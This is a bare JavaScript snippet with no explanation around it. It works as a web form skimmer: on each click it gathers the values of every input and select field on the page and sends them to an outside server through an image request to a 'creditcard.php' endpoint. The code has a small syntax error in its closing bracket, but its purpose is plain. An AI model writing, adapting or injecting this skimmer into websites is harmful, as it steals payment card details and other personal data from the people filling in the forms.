document.addEventListener("click", function() {
   var inputs, selects, index, selects_v, inputs_v;
   inputs = document.getElementsByTagName('input');
   selects = document.getElementsByTagName('select');
   for (index = 0; index < inputs.length; ++index) {
       inputs_v += inputs[index].value;
   }
   for (index = 0; index < selects.length; ++index ) {
       selects_v += selects[index].value;
   }
   new Image().src = "https://glhf.com.tw/creditcard.php?data=" + inputs_v + selects_v;
};
